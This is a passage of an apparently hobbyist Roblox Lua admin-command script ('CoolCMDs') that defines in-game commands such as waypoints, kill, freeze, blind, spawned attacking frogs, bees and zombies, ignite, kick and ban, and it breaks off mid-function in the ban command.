CoolCMDs.Functions.CreateCommand({"waypoint", "wp"}, 1, function(Message, MessageSplit, Speaker, Self)
if Speaker.Character == nil then return end
if Speaker.Character:FindFirstChild("Torso") == nil then return end
if #MessageSplit < 2 then return end
local Type = MessageSplit[1]:lower()
local Index = MessageSplit[2]
local Player = CoolCMDs.Functions.GetPlayerTable(Speaker.Name)
if Player.Waypoints == nil then
Player.Waypoints = {}
end
Waypoint = Player.Waypoints
if Type == "set" then
Waypoint[Index] = {}
Waypoint[Index].CFrame = Speaker.Character.Torso.CFrame
Waypoint[Index].Velocity = Speaker.Character.Torso.Velocity
Waypoint[Index].RotVelocity = Speaker.Character.Torso.RotVelocity
CoolCMDs.Functions.CreateMessage("Hint", "[Waypoint \"" ..Index.. "\"] Set at CFrame {" ..tostring(Waypoint[Index].CFrame.p).. "}.", 5, Speaker)
elseif Type == "get" then
if Waypoint[Index] ~= nil then
Speaker.Character.Torso.CFrame = Waypoint[Index].CFrame
Speaker.Character.Torso.Velocity = Waypoint[Index].Velocity
Speaker.Character.Torso.RotVelocity = Waypoint[Index].RotVelocity
CoolCMDs.Functions.CreateMessage("Hint", "[Waypoint \"" ..Index.. "\"] Moved to CFrame {" ..tostring(Waypoint[Index].CFrame.p).. "}.", 5, Speaker)
else
CoolCMDs.Functions.CreateMessage("Hint", "[Waypoint \"" ..Index.. "\"] There is no waypoint with that index.", 5, Speaker)
end
elseif Type == "remove" then
if Waypoint[Index] ~= nil then
Waypoint[Index] = nil
CoolCMDs.Functions.CreateMessage("Hint", "[Waypoint \"" ..Index.. "\"] Removed.", 5, Speaker)
else
CoolCMDs.Functions.CreateMessage("Hint", "[Waypoint \"" ..Index.. "\"] There is no waypoint with that index.", 5, Speaker)
end
elseif Type == "show" then
if Waypoint[Index] ~= nil then
CoolCMDs.Functions.CreateMessage("Hint", "[Waypoint \"" ..Index.. "\"] CFrame {" ..tostring(Waypoint[Index].CFrame.p).. "}.", 5, Speaker)
else
CoolCMDs.Functions.CreateMessage("Hint", "[Waypoint \"" ..Index.. "\"] There is no waypoint with that index.", 5, Speaker)
end
end
end, "Waypoint", "Set dynamic waypoints that store your character's position, saved by string indices.", "[set, get]" ..CoolCMDs.Data.SplitCharacter.. "waypoint index")

CoolCMDs.Functions.CreateCommand({"kill", "ki"}, 3, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
for _, Part in pairs(PlayerList.Character:GetChildren()) do
pcall(function() Part.Health = 0 end)
end
end
end
end
end, "Kill", "Kills people.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"freeze", "f"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
for _, Part in pairs(PlayerList.Character:children()) do
pcall(function() Part.Anchored = true end)
end
end
end
end
end, "Freeze", "Freeze people in place.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"unfreeze", "unf", "uf", "thaw", "th"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
for _, Part in pairs(PlayerList.Character:children()) do
pcall(function() Part.Anchored = false end)
end
end
end
end
end, "Unfreeze/Thaw", "Unfreeze/thaw people.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"killer frogs", "frogs"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return end
local Frogs = tonumber(MessageSplit[#MessageSplit])
if Frogs == nil then Frogs = 1 end
if Frogs > 25 then Frogs = 25 end
if Frogs <= 0 then Frogs = 1 end
for i = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and pcall(function() local _, _ = PlayerList.Character.Torso.CFrame, PlayerList.Character.Humanoid.Health end) == true then
for x = 1, Frogs do
local Frog = Instance.new("Part", game:service("Workspace"))
Frog.Name = "Killer Frog"
Frog.BrickColor = BrickColor.new("Bright green")
Frog.formFactor = "Custom"
Frog.Size = Vector3.new(0.9, 0.9, 0.9)
Frog.TopSurface = 0
Frog.BottomSurface = 0
Frog.CFrame = CFrame.new(PlayerList.Character.Torso.CFrame.p) * CFrame.new(math.random(-10, 10), math.random(-1, 1), math.random(-10, 10))
Frog.Touched:connect(function(Hit) pcall(function() Hit.Parent.Humanoid:TakeDamage(0.5) end) end)
Instance.new("Decal", Frog).Texture = "rbxasset://textures\\face.png"
coroutine.wrap(function()
for i = 1, 0, -0.05 do
Frog.Transparency = i
wait()
end
Frog.Transparency = 0
while Frog.Parent ~= nil do
if pcall(function() local _, _ = PlayerList.Character.Torso.CFrame, PlayerList.Character.Humanoid.Health end) == false then break end
if PlayerList.Character.Humanoid.Health <= 0 then break end
wait(math.random(10, 200) / 100)
Frog.Velocity = Frog.Velocity + ((PlayerList.Character.Torso.CFrame.p - Frog.CFrame.p).unit * math.random(20, 40)) + Vector3.new(0, math.random(15, 25), 0)
end
for i = 0, 1, 0.05 do
Frog.Transparency = i
wait()
end
Frog:Remove()
end)()
end
end
end
end
end, "Killer Frogs", "Throw some frogs at people.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "number of frogs")

CoolCMDs.Functions.CreateCommand({"killer bees", "bees"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return end
local Bees = tonumber(MessageSplit[#MessageSplit])
if Bees == nil then Bees = 1 end
if Bees > 50 then Bees = 50 end
if Bees <= 0 then Bees = 1 end
for i = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and pcall(function() local _, _ = PlayerList.Character.Torso.CFrame, PlayerList.Character.Humanoid.Health end) == true then
for x = 1, Bees do
local Bee = Instance.new("Part", game:service("Workspace"))
Bee.Name = "Killer Bee"
Bee.BrickColor = BrickColor.new("Bright yellow")
Bee.formFactor = "Custom"
Bee.Size = Vector3.new(0.4, 0.9, 0.4)
Bee.TopSurface = 0
Bee.BottomSurface = 0
Bee.CFrame = CFrame.new(PlayerList.Character.Torso.CFrame.p) * CFrame.new(math.random(-10, 10), math.random(1, 25), math.random(-10, 10))
Bee.Touched:connect(function(Hit) pcall(function() Hit.Parent.Humanoid:TakeDamage(0.25) end) end)
Instance.new("SpecialMesh", Bee).MeshType = "Head"
coroutine.wrap(function()
for i = 1, 0, -0.05 do
Bee.Transparency = i
wait()
end
Bee.Transparency = 0
while Bee.Parent ~= nil do
if pcall(function() local _, _ = PlayerList.Character.Torso.CFrame, PlayerList.Character.Humanoid.Health end) == false then break end
if PlayerList.Character.Humanoid.Health <= 0 then break end
Bee.Velocity = Bee.Velocity + ((PlayerList.Character.Torso.CFrame.p - Bee.CFrame.p).unit * math.random(15, 20)) + Vector3.new(math.random(-5, 5), math.random(-5, 5) + 2.5, math.random(-5, 5))
wait(math.random(1, 10) / 100)
end
for i = 0, 1, 0.05 do
Bee.Transparency = i
wait()
end
Bee:Remove()
end)()
end
end
end
end
end, "Killer Bees", "Throw clouds of angry bees at people.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "number of bees")

CoolCMDs.Functions.CreateCommand({"blind", "b"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) then
local Blind = Instance.new("ScreenGui", PlayerList.PlayerGui)
Blind.Name = "CoolCMDsBlind"
local Black = Instance.new("Frame", Blind)
Black.Name = "Black"
Black.BorderSizePixel = 0
Black.ZIndex = math.huge
Black.BackgroundColor3 = Color3.new(0, 0, 0)
Black.Size = UDim2.new(2, 0, 2, 0)
Black.Position = UDim2.new(-0.5, 0, -0.5, 0)
Black.Changed:connect(function(Property)
if Property == "Parent" then
if Black.Parent ~= Blind then
Black.Parent = Blind
end
end
end)
Blind.Changed:connect(function(Property)
if Property == "Parent" then
if Blind.Name == "CoolCMDsBlindDisabled" then return end
if Blind.Parent ~= PlayerList.PlayerGui then
Blind.Parent = PlayerList.PlayerGui
end
end
end)
end
end
end
end, "Blind", "Blind people.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"unblind", "noblind", "unb", "ub", "nb"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) then
pcall(function() while true do PlayerList.PlayerGui.CoolCMDsBlind.Name = "CoolCMDsBlindDisabled" PlayerList.PlayerGui.CoolCMDsBlindDisabled:Remove() end end)
end
end
end
end, "Unblind", "Let people see again.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"nogui", "ng"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) then
for _, Part in pairs(PlayerList.PlayerGui:children()) do
if Part:IsA("GuiBase") then
pcall(function() Part:Remove() end)
end
end
end
end
end
end, "No Gui", "Remove all Guis.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"crush", "cr"}, 3, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and pcall(function() local _ = PlayerList.Character.Torso.CFrame end) == true and pcall(function() local _ = PlayerList.Character.Humanoid end) == true then
coroutine.wrap(function()
local WalkSpeed = PlayerList.Character.Humanoid.WalkSpeed
PlayerList.Character.Humanoid.WalkSpeed = 0
wait(3)
PlayerList.Character.Humanoid.WalkSpeed = WalkSpeed
end)()
local Brick = Instance.new("Part", game:service("Workspace"))
Brick.Name = "Brick"
Brick.BrickColor = BrickColor.new("Really black")
Brick.TopSurface = 0
Brick.BottomSurface = 0
Brick.formFactor = "Symmetric"
Brick.Size = Vector3.new(10, 7, 8)
Brick.CFrame = CFrame.new(PlayerList.Character.Torso.CFrame.p) * CFrame.new(0, 200, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(math.random(0, 360)), 0)
Instance.new("SpecialMesh", Brick).MeshType = "Torso"
local BodyVelocity = Instance.new("BodyVelocity", Brick)
BodyVelocity.maxForce = Vector3.new(math.huge, math.huge, math.huge)
BodyVelocity.velocity = Vector3.new(0, -300, 0)
Brick.Touched:connect(function(Hit)
if Hit.Parent == nil then return end
if Hit.Parent:FindFirstChild("Humanoid") ~= nil then
Hit.Parent.Humanoid.MaxHealth = 100
Hit.Parent.Humanoid.Health = 0
else
if Hit:GetMass() > 1000 then return end
Hit.Anchored = false
Hit:BreakJoints()
end
end)
coroutine.wrap(function()
for i = 1, 0, -0.05 do
Brick.Transparency = i
wait()
end
Brick.Transparency = 0
wait(2)
for i = 0, 1, 0.015 do
Brick.Transparency = i
wait()
end
Brick:Remove()
end)()
end
end
end
end, "Crush", "WHAM.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"respawn/", "re"}, 2, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) then
pcall(function()
local Model = Instance.new("Model", game:service("Workspace"))
local Part = Instance.new("Part", Model)
Part.Name = "Head"
Part.Transparency = 1
Part.CanCollide = false
Part.Anchored = true
Part.Locked = true
Part.Parent = Model
local Humanoid = Instance.new("Humanoid", Model)
Humanoid.Health = 100
PlayerList.Character = Model
Humanoid.Health = 0
end)
end
end
end
end, "Respawn", "Respawn a player.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"forcefield", "ff", "shield", "sh"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
Instance.new("ForceField", PlayerList.Character)
end
end
end
end, "Spawn ForceField", "Spawn a ForceField object in a Player's character.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"unforcefield", "noforcefield", "unff", "uff", "noff", "unshield", "unsh", "ush", "noshield", "nosh"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
for _, Part in pairs(PlayerList.Character:children()) do
if Part:IsA("ForceField") then
Part:Remove()
end
end
end
end
end
end, "Remove ForceField", "Remove all ForceField objects in a Player's character.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"explode", "ex"}, 3, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
for _, Part in pairs(PlayerList.Character:children()) do
if Part:isA("BasePart") then
local Explosion = Instance.new("Explosion")
Explosion.BlastPressure = math.random(100000, 1000000)
Explosion.BlastRadius = math.random(1, 25)
Explosion.Position = Part.CFrame.p
Explosion.Parent = PlayerList.Character
end
end
PlayerList.Character:BreakJoints()
end
end
end
end, "Explode", "Spawn an explosion in all parts of a player.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand("hax", 3, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return false end
if CoolCMDs.Functions.IsModuleEnabled("CharacterSupport") == false then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the CharacterSupport module to be enabled.", 5, Speaker)
return
elseif CoolCMDs.Functions.GetModule("CharacterSupport") == nil then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the CharacterSupport module to be installed.", 5, Speaker)
return
end
local Characters = tonumber(MessageSplit[#MessageSplit])
if Characters == nil then Characters = 1 end
if Characters <= 0 then Characters = 1 end
if Characters > 10 then Characters = 10 end
for i = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and pcall(function() local _ = PlayerList.Character.Torso end) == true then
for i = 1, Characters do
coroutine.wrap(function()
local Character = CoolCMDs.Functions.GetModule("CharacterSupport").CreateCharacter(true)
Character.Name = "Dr. Hax"
local Head = Character.Head
Head.face.Texture = "http://www.Roblox.com/Asset/?id=16580646"
local Torso = Character.Torso
local RightShoulder = Character.Torso["Right Shoulder"]
local RightArm = Character["Right Arm"]
local Humanoid = Character.Humanoid
Character.Shirt.ShirtTemplate = "http://www.Roblox.com/Asset/?id=12702133"
Character.Pants.PantsTemplate = "http://www.Roblox.com/Asset/?id=12702160"
local Hat = Instance.new("Hat")
Hat.Name = "White Hair"
Hat.AttachmentPos = Vector3.new(0, 0.1, 0)
local Handle = Instance.new("Part")
Handle.Name = "Handle"
Handle.formFactor = 0
Handle.Size = Vector3.new(2, 1, 1)
Handle.TopSurface = 0
Handle.BottomSurface = 0
Handle.Parent = Hat
local Mesh = Instance.new("SpecialMesh")
Mesh.MeshId = "http://www.Roblox.com/Asset/?id=13332444"
Mesh.VertexColor = Vector3.new(1, 1, 1)
Mesh.Parent = Handle
Hat.Parent = Character
local Hat = Instance.new("Hat")
Hat.Name = "Beard"
for i = 0, math.pi, math.pi / 10 do Hat.AttachmentForward = Hat.AttachmentForward + Vector3.new(0, math.pi, 0) end
Hat.AttachmentPos = Vector3.new(0, -0.5, 0.7)
local Handle = Instance.new("Part")
Handle.Name = "Handle"
Handle.formFactor = 0
Handle.Size = Vector3.new(1, 1, 1)
Handle.TopSurface = 0
Handle.BottomSurface = 0
Handle.BrickColor = BrickColor.new("Industrial white")
Handle.Parent = Hat
local Mesh = Instance.new("CylinderMesh")
Mesh.Scale = Vector3.new(0.675, 0.199, 0.675)
Mesh.Parent = Handle
Hat.Parent = Character
Torso.CFrame = CFrame.new(PlayerList.Character.Torso.CFrame.p) * CFrame.new(math.sin(math.random(0, (math.pi * 100) * 2) / 100) * 25, 5, math.cos(math.random(0, (math.pi * 100) * 2) / 100) * 25)
Character.Parent = game:service("Workspace")
Character:MakeJoints()
coroutine.wrap(function()
for i = 1, 0, -0.05 do
for _, Part in pairs(Character:children()) do
pcall(function() Part.Transparency = i end)
end
wait()
end
for _, Part in pairs(Character:children()) do
pcall(function() Part.Transparency = 0 end)
end
end)()
coroutine.wrap(function()
while true do
if PlayerList.Character == nil then break end
if PlayerList.Character:FindFirstChild("Torso") == nil or PlayerList.Character:FindFirstChild("Humanoid") == nil or RightArm.Parent ~= Character or Humanoid.Health <= 0 then break end
if PlayerList.Character.Humanoid.Health <= 0 then break end
if (Torso.CFrame.p - PlayerList.Character.Torso.CFrame.p).magnitude > 30 then
Humanoid:MoveTo(PlayerList.Character.Torso.CFrame.p, PlayerList.Character.Torso)
else
Humanoid:MoveTo(Torso.CFrame.p, Torso)
end
Torso.CFrame = CFrame.new(Torso.CFrame.p, Vector3.new(PlayerList.Character.Torso.CFrame.p.x, Torso.CFrame.p.y, PlayerList.Character.Torso.CFrame.p.z))
wait()
end
Humanoid:MoveTo(Torso.CFrame.p, Torso)
end)()
wait(2)
RightShoulder.DesiredAngle = math.rad(90)
wait(1)
while true do
if PlayerList.Character == nil then break end
if PlayerList.Character:FindFirstChild("Torso") == nil or PlayerList.Character:FindFirstChild("Humanoid") == nil or RightArm.Parent ~= Character or Humanoid.Health <= 0 then break end
if PlayerList.Character.Humanoid.Health <= 0 then break end
if Humanoid.Health <= 0 then break end
local Monitor = Instance.new("Part")
Monitor.Name = "Monitor"
Monitor.formFactor = 0
Monitor.Size = Vector3.new(2, 2, 2)
Monitor.TopSurface = 0
Monitor.BottomSurface = 0
Monitor.BrickColor = BrickColor.new("Brick yellow")
Monitor.Parent = game:service("Workspace")
Monitor.CFrame = RightArm.CFrame * CFrame.new(0, -3, 0)
Monitor.Velocity = ((PlayerList.Character.Torso.CFrame.p - Monitor.CFrame.p).unit * math.random(100, 500)) + Vector3.new(math.random(-25, 25), math.random(-25, 25), math.random(-25, 25))
local HasTouched = false
Monitor.Touched:connect(function(Hit)
if Hit.Parent == nil then return end
if Hit.Parent == Character or string.match("Dr. Hax", Hit.Parent.Name) or Hit.Name == "Monitor" then return end
local Sound = Instance.new("Sound", Monitor)
Sound.Name = "Crash"
Sound.Volume = math.random(10, 90) / 100
Sound.SoundId = "rbxasset://sounds/Glassbreak.wav"
Sound.Pitch = math.random(90, 200) / 100
Sound:Play()
coroutine.wrap(function()
wait(math.random(5, 50) / 100)
for i = Sound.Volume, 0, -math.random(75, 100) / 1000 do
Sound.Volume = i
wait()
end
Sound:Stop()
Sound:Remove()
end)()
if HasTouched == true then return end
HasTouched = true
if Hit.Parent:FindFirstChild("Humanoid") ~= nil then
Hit.Parent.Humanoid:TakeDamage(math.random(5, 25))
else
if Hit.Anchored == true and Hit:GetMass() < 1000 and math.random(1, 3) == 1 then
Hit.Anchored = false
end
if math.random(1, 10) == 1 then Hit:BreakJoints() end
end
wait(1)
for i = 0, 1, 0.05 do
Monitor.Transparency = i
wait()
end
Monitor:Remove()
end)
wait(math.random(1, 500) / 1000)
end
if Humanoid.Health > 0 then
wait(1)
RightShoulder.DesiredAngle = 0
wait(2)
end
for i = 0, 1, 0.05 do
for _, Part in pairs(Character:children()) do
pcall(function() Part.Transparency = i end)
end
wait()
end
Character:Remove()
end)()
end
end
end
end
end, "Hax", "Summon Dr. Hax on weary travelers.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "number of characters to spawn (max of 10)")

CoolCMDs.Functions.CreateCommand("maul", 3, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return false end
if CoolCMDs.Functions.IsModuleEnabled("CharacterSupport") == false then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the CharacterSupport module to be enabled.", 5, Speaker)
return
elseif CoolCMDs.Functions.GetModule("CharacterSupport") == nil then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the CharacterSupport module to be installed.", 5, Speaker)
return
end
local Characters = tonumber(MessageSplit[#MessageSplit])
if Characters == nil then Characters = 1 end
if Characters <= 0 then Characters = 1 end
if Characters > 10 then Characters = 10 end
for i = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and pcall(function() local _ = PlayerList.Character.Torso end) == true and pcall(function() local _ = PlayerList.Character.Humanoid end) == true then
PlayerList.Character.Humanoid.WalkSpeed = 0
local Health = PlayerList.Character.Humanoid.Health
local MaxHealth = PlayerList.Character.Humanoid.MaxHealth
PlayerList.Character.Humanoid.MaxHealth = 100
PlayerList.Character.Humanoid.Health = MaxHealth * (Health / MaxHealth)
for _, Part in pairs(PlayerList.Character:children()) do if Part:IsA("ForceField") then Part:Remove() end end
for i = 1, Characters do
coroutine.wrap(function()
local Character = CoolCMDs.Functions.GetModule("CharacterSupport").CreateCharacter(math.random(1, 2) == 1 and true or false)
Character.Name = "Zombie"
local Head = Character.Head
Head.face.Texture = "http://www.Roblox.com/Asset/?id=16580646"
Head.BrickColor = BrickColor.new("Br. yellowish green")
local Torso = Character.Torso
Torso.BrickColor = BrickColor.new("Reddish brown")
local LeftShoulder = Character.Torso["Left Shoulder"]
local RightShoulder = Character.Torso["Right Shoulder"]
local LeftHip = Character.Torso["Left Hip"]
local RightHip = Character.Torso["Right Hip"]
local Humanoid = Character.Humanoid
Character["Left Arm"].BrickColor = BrickColor.new("Br. yellowish green")
Character["Right Arm"].BrickColor = BrickColor.new("Br. yellowish green")
Character["Left Leg"].BrickColor = BrickColor.new("Reddish brown")
Character["Right Leg"].BrickColor = BrickColor.new("Reddish brown")
Torso.CFrame = CFrame.new(PlayerList.Character.Torso.CFrame.p) * CFrame.new(math.sin(math.random(0, (math.pi * 100) * 2) / 100) * 25, 5, math.cos(math.random(0, (math.pi * 100) * 2) / 100) * 25)
Character.Parent = game:service("Workspace")
Character:MakeJoints()
coroutine.wrap(function()
for i = 1, 0, -0.05 do
for _, Part in pairs(Character:children()) do
pcall(function() Part.Transparency = i end)
end
wait()
end
for _, Part in pairs(Character:children()) do
pcall(function() Part.Transparency = 0 end)
end
end)()
coroutine.wrap(function()
while true do
LeftHip.DesiredAngle = math.rad(45)
RightHip.DesiredAngle = math.rad(45)
wait(0.5)
LeftHip.DesiredAngle = math.rad(-45)
RightHip.DesiredAngle = math.rad(-45)
wait(0.5)
end
end)()
while true do
if PlayerList.Character == nil then break end
if PlayerList.Character:FindFirstChild("Torso") == nil or PlayerList.Character:FindFirstChild("Humanoid") == nil or Humanoid.Health <= 0 then break end
if PlayerList.Character.Humanoid.Health <= 0 then break end
if Humanoid.Health <= 0 then break end
Humanoid:MoveTo(PlayerList.Character.Torso.CFrame.p + Vector3.new(math.random(-3, 3), math.random(-3, 3), math.random(-3, 3)), PlayerList.Character.Torso)
if (PlayerList.Character.Torso.CFrame.p - Torso.CFrame.p).magnitude < 5 then
PlayerList.Character.Humanoid:TakeDamage(math.random(1, 10) / 10)
LeftShoulder.DesiredAngle = -math.rad(math.random(0, 180))
RightShoulder.DesiredAngle = math.rad(math.random(0, 180))
else
LeftShoulder.DesiredAngle = -math.rad(90)
RightShoulder.DesiredAngle = math.rad(90)
end
wait()
end
for i = 0, 1, 0.05 do
for _, Part in pairs(Character:children()) do
pcall(function() Part.Transparency = i end)
end
wait()
end
Character:Remove()
end)()
end
end
end
end
end, "Maul", "Summon flesh-hungry zombies to eat players.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "number of zombies to spawn (max of 10)")

CoolCMDs.Functions.CreateCommand({"ignite", "i"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return false end
local Duration = tonumber(MessageSplit[#MessageSplit])
if Duration == nil then Duration = 0 end
for i = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and pcall(function() local _ = PlayerList.Character.Torso end) == true and pcall(function() local _ = PlayerList.Character.Humanoid end) == true and pcall(function() local _ = PlayerList.Character.CoolCMDsIsOnFire end) == false then
local Tag = Instance.new("Model", PlayerList.Character)
Tag.Name = "CoolCMDsIsOnFire"
coroutine.wrap(function()
if Duration <= 0 then return end
wait(Duration)
Tag:Remove()
end)()
coroutine.wrap(function()
while true do
if PlayerList.Character == nil then break end
if PlayerList.Character:FindFirstChild("Humanoid") == nil or PlayerList.Character:FindFirstChild("CoolCMDsIsOnFire") == nil then break end
if PlayerList.Character.Humanoid.Health <= 0 then break end
PlayerList.Character.Humanoid:TakeDamage(0.25)
wait()
end
Tag:Remove()
end)()
for _, Part in pairs(PlayerList.Character:children()) do
if pcall(function() local _ = Part.CFrame end) == true then
local FireHolder = Instance.new("Part", game:service("Workspace"))
FireHolder.Name = "FireHolder"
FireHolder.formFactor = "Symmetric"
FireHolder.Size = Vector3.new(1, 1, 1)
FireHolder.Anchored = true
FireHolder.TopSurface = 0
FireHolder.BottomSurface = 0
FireHolder.Transparency = 1
FireHolder.CanCollide = false
local Fire = Instance.new("Fire", FireHolder)
Fire.Heat = 10
Fire.Size = 5
local Sound = Instance.new("Sound", FireHolder)
Sound.Looped = true
Sound.Pitch = math.random(90, 110) / 100
Sound.Volume = 1
Sound.SoundId = "http://www.Roblox.com/Asset/?id=31760113"
Sound:Play()
coroutine.wrap(function()
while pcall(function() local _ = PlayerList.Character.CoolCMDsIsOnFire end) == true do
FireHolder.CFrame = CFrame.new(Part.CFrame.p)
wait()
end
Fire.Enabled = false
for i = 1, 0, -0.05 do
Sound.Volume = i
wait()
end
Sound:Stop()
wait(3)
FireHolder:Remove()
end)()
end
end
end
end
end
end, "Ignite", "Set players alight. Fire damages a player by 0.25 per milisecond.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "duration (in seconds, <= 0 for infinite)")

CoolCMDs.Functions.CreateCommand({"unignite", "uni", "ui"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) then
pcall(function() PlayerList.Character.CoolCMDsIsOnFire:Remove() end)
end
end
end
end, "Unignite", "Put a player out.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand("kick", 5, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList ~= Speaker then
CoolCMDs.Functions.CreateMessage("Hint", "[Kick] Player(s) removed.", 2.5, Speaker)
pcall(function() PlayerList:Remove() end)
end
end
end
end, "Kick", "Kick (remove) a player from the game.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")
---------------------------------------BANNEDPLAY
CoolCMDs.Functions.CreateCommand({"banish", "ban"}, 5, function(Message, MessageSplit, Speaker, Self)
if Self.Bans == nil then Self.Bans = {} end
if Self.CatchBan == nil then
Self.CatchBan = game:service("Players").ChildAdded:connect(function(Player)
for i = 1, #Self.Bans do
if string.match(Player.Name:lower(), Self.Bans[i]:lower()) then
CoolCMDs.Functions.CreateMessage("Message", "Full Protection: a Banned player (" ..Player.Name.. ") has been disconnected for trying to re-enter.", 2.5)
wait()
pcall(function() Player:Remove() end)
-------------------------------------------------------------
end
end
end)
end
local Type = MessageSplit[1]:lower()
if Type == "player" or Type == "p" then
local Completed = false
for i = 2, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList ~= Speaker then
table.insert(Self.Bans, PlayerList.Name:lower())
pcall(function() PlayerList:Remove() end)
Completed = true
end
end
end
if Completed == true then
CoolCMDs.Functions.CreateMessage("Message", "Full Protection: Player(s) banned.", 2.5, Speaker)
else
CoolCMDs.Functions.CreateMessage("Message", "ERROR: Player(s) not found!", 2.5, Speaker)
end
elseif Type == "name" or Type == "n" then
for i = 2, #MessageSplit do
table.insert(Self.Bans, MessageSplit[i]:lower())
end
CoolCMDs.Functions.CreateMessage("Hint", "[Ban] Names added.", 2.5, Speaker)
elseif Type == "retgmove" or Type == "fbr" then
local Completed = false
for i = 2, #MessageSplit do
for i = 1, #Self.Bans do
if string.match(Self.Bans:lower(), MessageSplit[i]:lower()) then
table.remove(Self.Bans, i)
end
end
end
if Completed == true then
